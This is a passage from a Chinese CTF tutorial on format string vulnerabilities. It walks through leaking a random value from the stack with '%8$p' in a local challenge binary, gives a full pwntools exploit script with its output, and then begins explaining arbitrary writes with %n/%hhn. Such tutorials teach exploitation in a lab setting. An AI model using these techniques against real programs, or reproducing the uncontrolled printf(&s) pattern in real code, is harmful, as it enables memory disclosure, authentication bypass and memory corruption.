
格式化字符串漏洞常见的标志为`printf(&str)`，其中`str`中的内容是可控的。`printf`在解析`format`参数时，会自动从栈上`format`字符串结束的位置，按顺序读取格式化字符串对应的参数。如图所示，执行的命令为`printf("%s %d %d %d %x",buf, 1, 2, 3)`，紧随格式化字串后压入栈上的参数为4个，但格式化字串有五个参数，`printf`在解析第五个参数`%x`时，会继续往栈上读取，造成了信息泄露：

![image-20200829113304904](https://bbs.kanxue.com/upload/attach/202009/750891_X46XP34MD4KTMHW.jpg)

## 题目分析

`checksec`信息如下，保护全开：

```
[*] '/home/hjc18/PWN/stack_learn/fmt_stack/pwn1'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      PIE enabled

```

`IDA`中主函数逻辑如下：首先判断用户名是否为`root`，然后从系统中读取一个随机数，判断用户的输入与随机数是否相等。随机数输入的长度限制为`0x50`，告别了栈溢出的可能，随机数输入错误1次后`exit_flag`会置`0`，在下一次输入错误后程序会退出。唯一的利用点在于程序中存在`printf(&s)`，而`s`是可控的，因此可以用格式化字符串的任意地址读功能获取随机数：

```
.data:0000000000202098 exit_flag       db    1    

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)

{

  int fd; // ST0C_4

  char buf; // [rsp+10h] [rbp-A0h]

  char s1; // [rsp+20h] [rbp-90h]

  char s; // [rsp+40h] [rbp-70h]

  unsigned __int64 v7; // [rsp+A8h] [rbp-8h]

  v7 = __readfsqword(0x28u);

  init_std();

  fd = open("/dev/urandom", 0);

  read(fd, &buf, 8uLL);

  close(fd);

  puts("Hi, please input your name:");

  read_func(&s1, 16LL);                         // equal to read(buf,size)

  if ( !strcmp(&s1, "root") )

  {

    printf("%s welcome to go home !\n", &s1);

    puts("Oh, I also need your password:");

    while ( 1 )

    {

      memset(&s, 0, 0x60uLL);

      read_func(&s, 0x50LL);

      if ( !strcmp(&s, &buf) )

        break;

      printf("Your password ", &buf);

      printf(&s);                               // vuln

      puts(" seem not ture......");

      if ( !exit_flag )

      {

        puts("Bye~");

        exit(0);

      }

      puts("Try again!");

      exit_flag = 0;

    }

    puts("You are my root!");

    exit(0);

  }

  puts("Who are you?");

  exit(0);

}

```

## 调试分析

在输入中输入格式化字符串`%x`，程序会打印栈上的信息：

```
Hi, please input your name:

root

root welcome to go home !

Oh, I also need your password:

%p %p %p %p %p %p %p %p %p

Your password 0x7ffce2b24580 0x7f06e850d8c0 (nil) 0xe 0x7f06e828ef70 (nil) 0x300000000 0x6db2adca20d558ab (nil) seem not ture......

Try again!

```

此时寄存器与栈的布局如下所示：

```
 #reg

 RAX  0x0

 RBX  0x0

 RCX  0x0

 RDX  0x7f06e850d8c0 

 RDI  0x7ffce2b26c60 -> '%p %p %p %p %p %p %p %p %p'

 RSI  0x7ffce2b24580 -> 'Your password o go home !\n'

 R8   0xe

 R9   0x7f06e828ef70

 R10  0x3

 R11  0x246

 R12  0x565314ac6a30 

 R13  0x7ffce2b26db0 

 R14  0x0

 R15  0x0

 RBP  0x7ffce2b26cd0 

 RSP  0x7ffce2b26c18 

 RIP  0x7f06e8184f00 

 #stack

rsp  0x7ffce2b26c18 -> 0x565314ac6e0e

     0x7ffce2b26c20 <- 0x0

     0x7ffce2b26c28 <- 0x300000000

     0x7ffce2b26c30 <- 0x6db2adca20d558ab

     0x7ffce2b26c38 <- 0x0

     0x7ffce2b26c40 <- 0x746f6f72 /* 'root' */

     0x7ffce2b26c48 <- 0x8000000000000006

     0x7ffce2b26c50 <- 0x0

rdi  0x7ffce2b26c60 <- '%p %p %p %p %p %p %p %p %p'

     0x7ffce2b26c68 <- ' %p %p %p %p %p %p'

     0x7ffce2b26c70 <- 'p %p %p %p'

     0x7ffce2b26c78 <- 0x7025 /* '%p' */

     0x7ffce2b26c80 <- 0x0

     0x7ffce2b26cc0 <-  0x7ffce2b26db0 

     0x7ffce2b26cc8 <- 0x9119a0b95845000

rbp  0x7ffce2b26cd0 <-  0x565314ac6e80 

     0x7ffce2b26cd8 <-  0x7f06e8141b97

```

通过观察我们可以发现，泄露出来的数据依次为`RSI RDX RCX R8 R9 RSP+0x8 RSP+0x10 RSP+0x18`的内容，在64位系统中，函数前6个参数通过寄存器传参，对应`RSI` `RDX RCX R8 R9`，函数不会泄露`RDI`，即格式化字符串本身的地址内容。当寄存器的内容不足以填满格式化字符串的参数时，`printf`会继续往栈上索引，从`RSP+0x8`，即`main`函数的栈基址开始读取，刚好在第8个参数泄露了位于`rsp+10h`的随机数`0x6db2adca20d558ab`。

现在我们知道怎么计算偏移来读取任意地址的信息了，如果读取离当前`RSP`很远的信息，比如偏移了100个`%p`，可以使用`$`占位符减少输入，`$`的含义为输出对应位置的参数，比如`%8$p`输出第8个`%p`的数据：

```
Hi, please input your name:

root

root welcome to go home !

Oh, I also need your password:

%8$p

Your password 0x1d894b7f31fe7418 seem not ture......

Try again!

```

再康康栈上的信息，刚好对应之前讲的第8个`%p`的输出内容：

```
rsp  0x7ffe0fbf9cf0 -> 0x0

     0x7ffe0fbf9cf8 -> 0x300000000

     0x7ffe0fbf9d00 -> 0x1d894b7f31fe7418 //random

     0x7ffe0fbf9d08 -> 0x8000000000000006

     0x7ffe0fbf9d10 -> 0x746f6f72 /* 'root' */

     0x7ffe0fbf9d18 -> 0x0

```

`pwngbd`提供了一种方便的函数`fmtarg`，使用格式为`fmtarg addr`。在进入`printf`函数时断下，调用`fmtarg`后可以自动计算格式化参数与`addr`的偏移。`fmtarg`在计算`index`时将`RDI`也算了进去，后面会自动减一作为`%$p`的参数：

```
# ins

-> 0x7f6507184f00 <printf>        sub    rsp, 0xd8

   0x7f6507184f07 <printf+7>      test   al, al

   0x7f6507184f09 <printf+9>      mov    qword ptr [rsp + 0x28], rsi

# stack

rsp  0x7ffd014b4248 <- 0x56029ee8ae0e 

     0x7ffd014b4250 -> 0x0

     0x7ffd014b4258 -> 0x300000000

     0x7ffd014b4260 -> 0x869b15527cfcfffa//random

     0x7ffd014b4268 -> 0x0

     0x7ffd014b4270 -> 0x746f6f72 /* 'root' */

     0x7ffd014b4278 -> 0x0

#use fmtarg -> targrt:0x7ffd014b4260

The index of format argument : 9 ("\%8$p")

```

## POC

现在我们已经可以泄露随机数，接下来利用思路就很简单了。第一轮利用格式化字符串漏洞读取随机数，第二轮直接将获取的随机数作为输入，即可“成为`root`”。完整`exp`如下：

```
from pwn import *

context.log_level = 'debug'

def lauch_gdb(p):

    context.log_level = 'debug'

    context.terminal = ['tmux', 'splitw', '-h']

    gdb.attach(p)

p = process('./pwn1')

elf = ELF('./pwn1')

libc = elf.libc

#lauch_gdb(p)

#pause()

rl = lambda a=False              : p.recvline(a)    #接收到\n，False表示丢弃\n

ru = lambda a,b=True             : p.recvuntil(a,b)

rn = lambda x                    : p.recvn(x)

sd = lambda x                    : p.send(x)

sl = lambda x                    : p.sendline(x)

sa = lambda a,b                  : p.sendafter(a,b)

sla = lambda a,b                 : p.sendlineafter(a,b)

irt = lambda                     : p.interactive()

uu32 = lambda data               : u32(data.ljust(4,'\x00'))

uu64 = lambda data               : u64(data.ljust(8,'\x00'))

cth = lambda content,length      : int(content[:length],16)

sla('name:','root')

sla('password','%8$p')

ru('password ')

content = ru(' seem')

ans = int(cth(content,18))

rl()

sla('again!',p64(ans))

irt()

```

程序输出如下：

```
[DEBUG] Received 0x1c bytes:

    'Hi, please input your name:\n'

[DEBUG] Sent 0x5 bytes:

    'root\n'

[DEBUG] Received 0x39 bytes:

    'root welcome to go home !\n'

    'Oh, I also need your password:\n'

[DEBUG] Sent 0x5 bytes:

    '%8$p\n'

[DEBUG] Received 0x40 bytes:

    'Your password 0x90b126967cc6caa3 seem not ture......\n'

    'Try again!\n'

[DEBUG] Sent 0x9 bytes:

    00000000  a3 ca c6 7c  96 26 b1 90  0a                        

    00000009

[*] Switching to interactive mode

[*] Process './pwn1' stopped with exit code 0 (pid 11275)

[DEBUG] Received 0x11 bytes:

    'You are my root!\n'

You are my root!

```

# 格式化字符串利用—写

## 漏洞原理

`printf`除了能将数据输出至标准输出，还能将数据输出至某一地址。`printf`通过`%n`、`%hn`、`%hhn`三个参数将**已打印的字符个数**输出至格式化参数对应的地址中，如：

```
#include<stdio.h>

int main()

{

    int a = 0;

    printf("aaaa%n",&a);

    printf("%d",a);

    return 0;

}

// -> a = 4

```

可以通过格式化串中的输出占位符来调整输出字符串的个数：

```
#include <stdio.h>

int main()

{

   char a = 'a';

    int b = 10;

   printf("%30c%n",a,&b);

   printf("%d",b);

   return 0;

}

// -> b = 30

```

`%n`一次写入四个字节，`%hn`一次写入两个字节，`%hhn`一次只写入一个字节。如果写入的字节数大于格式化字符串所对应的最大字节数，则发生溢出置0。在空间足够的情况下，推荐使用`%hhn`进行写入，一来可以避免`sprintf`等函数末尾自动填充`\0`，二来通过溢出修改写入字节（如`0x64 -> 0x32`）所需的字符数较少，不会卡死。如果空间有限，则需酌情考虑使用其他格式字串或更换方法：

```
#include <stdio.h>
int main()
{
   char a = 'a';
   int b = 0;
   printf("%255c%hhn\n\n",a,&b);//0xff = 255
    printf("%d",b);
   return 0;
}
// -> b = 255
#include <stdio.h>
int main()
{
   char a = 'a';
   int b = 0;
   printf("%256c%hhn\n\n",a,&b);//256=0x100
    printf("%d",b);
   return 0;
}
// -> b = 0xff+1 = 0x(1)00 = 0x00   !!!
```

### 简单示例

与其他格式化字符串一样，`%n`系列也可以通过 `$`运算符来进行偏移，从而实现任意地址写的功能。下面我们通过一个简单的实例来康康如何进行写入，`demo`源码如下：

```
#include<stdio.h>
int main()
{
    char a[] = "aaaaaaa";
    long int t = 10;
    long int* d = &t;
    printf("%65c%7$hhn"); // 模拟printf(&s)
    printf("after printf, t=%d",t);
    return 0;
}
```

程序执行到`printf`前，栈上的数据分布如下：
